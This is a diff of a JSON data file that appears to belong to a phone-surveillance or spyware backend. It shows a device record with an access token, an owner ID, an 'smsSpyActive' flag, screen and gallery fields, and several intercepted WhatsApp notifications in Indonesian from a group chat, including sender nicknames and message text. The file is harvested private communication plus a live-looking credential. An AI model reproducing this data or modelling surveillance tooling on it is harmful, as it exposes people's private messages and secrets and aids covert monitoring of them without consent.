@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775043512759,
+    "lastSeen": 1775043515763,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15151 pesan dari 10 chat",
+        "time": "01/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043516282
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12871 pesan): ~ r",
+        "content": "beri jalan",
+        "time": "01/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043516205
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15150 pesan dari 10 chat",
+        "time": "01/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043514700
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12870 pesan): ~ Dapa",
@@ -3995,30 +4019,6 @@
         "time": "01/04 19:29",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042955895
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14949 pesan dari 9 chat",
-        "time": "01/04 19:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042955447
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12695 pesan): ~ Bot",
-        "content": "📷 🎮 TEBAKGAMBAR\n\nGambar jin, istana, dan huruf H.\n\n⏳ Jawab dalam 60 detik!\n📌 CARA JAWAB: Balas/Reply pesan ini dengan jawabanmu!\n> gunakan .nyerah untuk menyerah.",
-        "time": "01/04 19:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042955339
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14947 pesan dari 9 chat",
-        "time": "01/04 19:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042953498
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12871 pesan): ~ r",
+        "content": "beri jalan",
+        "time": "01/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043516323
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15151 pesan dari 10 chat",
+        "time": "01/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043516309
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15150 pesan dari 10 chat",
+        "time": "01/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043514683
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12870 pesan): ~ Dapa",
@@ -8040,30 +8064,6 @@
         "time": "01/04 19:29",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042955805
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12695 pesan): ~ Bot",
-        "content": "📷 🎮 TEBAKGAMBAR\n\nGambar jin, istana, dan huruf H.\n\n⏳ Jawab dalam 60 detik!\n📌 CARA JAWAB: Balas/Reply pesan ini dengan jawabanmu!\n> gunakan .nyerah untuk menyerah.",
-        "time": "01/04 19:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042955487
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14949 pesan dari 9 chat",
-        "time": "01/04 19:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042955464
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14947 pesan dari 9 chat",
-        "time": "01/04 19:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042953462
       }
     ],
     "galleryPhotos": [],
